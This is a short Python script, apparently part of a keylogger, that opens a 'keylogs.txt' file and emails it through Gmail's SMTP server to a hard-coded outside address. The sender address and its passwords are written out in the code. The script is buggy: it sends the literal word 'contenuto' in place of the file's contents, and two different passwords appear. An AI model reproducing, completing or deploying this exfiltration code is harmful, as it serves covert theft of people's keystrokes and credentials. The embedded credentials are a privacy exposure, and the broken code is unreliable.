import smtplib
import os
contenuto = None
LaMiaEmail = ('nomeacaso5.0@gmail.com')
LaMiaPassword = ('ghfrtzawoyezhllb')
EmailDiDestinazione = ('coluich1220@gmail.com')
x=open('keylogs.txt','r')
x.read(contenuto)
mail = smtplib.SMTP('smtp.gmail.com', 587)
mail.ehlo()
mail.starttls() # email criptata
mail.login('nomeacaso5.0@gmail.com', 'Qf@MNea1sbq!U@gIMFe9riZw$0gEGXIBtgUXjN3S')
mail.sendmail('nomeacaso5.0@gmail.com', 'coluich1220@gmail.com', 'contenuto')
mail.close()